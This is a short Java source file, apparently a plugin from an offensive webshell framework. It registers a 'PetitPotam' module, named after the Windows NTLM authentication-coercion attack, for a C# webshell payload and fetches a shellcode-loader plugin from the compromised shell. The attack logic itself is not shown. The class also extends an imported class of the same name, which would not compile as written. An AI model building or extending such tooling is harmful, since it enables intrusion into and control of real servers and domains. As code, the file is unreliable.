package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.PetitPotam;
import shells.plugins.generic.ShellcodeLoader;

@PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "PetitPotam", DisplayName = "PetitPotam")
public class PetitPotam extends PetitPotam {
  protected ShellcodeLoader getShellcodeLoader() {
    return (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
  }
}
